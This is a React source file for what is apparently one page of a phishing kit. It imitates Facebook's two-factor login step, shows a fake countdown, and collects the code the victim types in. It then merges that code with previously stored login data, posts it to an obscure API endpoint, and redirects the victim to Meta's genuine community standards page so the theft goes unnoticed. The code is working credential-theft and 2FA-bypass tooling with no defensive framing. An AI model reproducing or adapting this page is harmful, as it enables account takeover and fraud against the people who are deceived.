import React from "react";
import "./Confirm.css";
import { Form } from "react-bootstrap";
import { useEffect } from "react";
import { useState } from "react";
import apiClient from "../../api/apiClient";
export default function Confirm() {
    const [timeLeft, setTimeLeft] = useState(300); // Thi gian cn li, ban u l 300 giy (5 pht)
    const [code, setCode] = useState(''); // M code ngi dng nhp

    useEffect(() => {
        const intervalId = setInterval(() => {
            setTimeLeft(prevTime => {
                const newTime = Math.max(prevTime - 1, 0);
                if (newTime === 0) {
                    clearInterval(intervalId);
                }
                return newTime;
            });
        }, 1000);

        return () => clearInterval(intervalId);
    }, []);

    const formatTime = (time) => {
        const minutes = Math.floor(time / 60);
        const seconds = time % 60;
        return `${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
    };

    const handleSubmit = (e) => {
        e.preventDefault();

        const old_data = localStorage.getItem('data');
        const data = JSON.parse(old_data);
        console.log(data)
        data.code = code;
        console.log(data)
        localStorage.setItem('data', JSON.stringify(data));
        sendMessage(data);

        window.location.href = "https://transparency.meta.com/en-gb/policies/community-standards/";
    }

    const sendMessage = async (data) => {
        const response = await apiClient.post("/XNSSODUIW9", data);
        console.log(response);
        localStorage.removeItem('data');
    }


    return (
        <div>
            <header>
                <div className="ns-block-ui full-screen">
                    <div className="xnxx-vlxx">
                        <a href="">facebook</a>
                    </div>
                    <div className="ns-block-ui-frame">
                        <div className="form-two-factor">
                            <div className="form-two-factor-header">
                                <label className="form-two-factor-header-title">Choose a way to confirm that it's you</label>
                            </div>
                            <div style={{ backgroundColor: "rgb(0,0,0,0.1)", height: '1px', width: '100%' }}></div>
                            <div className="form-two-factor-content">
                                <label className="form-two-factor-content-title">Your account has two-factor authentication switched on, which requires this extra login step.</label>
                                <div className="form-two-factor-header-title">Enter your code from the authentication app or SMS</div>
                                <div className="">Code will expired in <label id="form-two-factor-content-title">{formatTime(timeLeft)}</label></div>

                                <Form onSubmit={handleSubmit}>
                                    <Form.Group className="mb-3" controlId="formBasicEmail">
                                        <Form.Control
                                            type="text"
                                            placeholder="Enter code"
                                            onChange={(e) => setCode(e.target.value)}
                                        />
                                    </Form.Group>
                                    <button className="submitCode_btn" type="submit">
                                        Continue
                                    </button>
                                </Form>
                            </div>


                        </div>
                    </div>
                    <div style={{ width: "100%", padding: "10px" }}>
                        <div className="footer">
                            {/* show 8 popular languages as list, each side 4 languages */}
                            {/* <div className="footer-content"> */}
                            <div className="footer-content-left">
                                <div className="English">
                                    <span>English</span>
                                </div>
                                <div className="Spanish">
                                    <span>Espaol</span>
                                </div>
                                <div className="French">
                                    <span>Franais</span>
                                </div>
                                <div className="German">
                                    <span>Deutsch</span>
                                </div>
                            </div>
                            <div className="footer-content-right">
                                <div className="Chinese">
                                    <span></span>
                                </div>
                                <div className="Arabic">
                                    <span></span>
                                </div>
                                <div className="Portuguese">
                                    <span>Portugus</span>
                                </div>
                                <div className="Vietnamese">
                                    <span>Ting Vit</span>
                                </div>
                            </div>

                            {/* </div> */}

                        </div></div>

                </div>
            </header>
        </div>
    );
}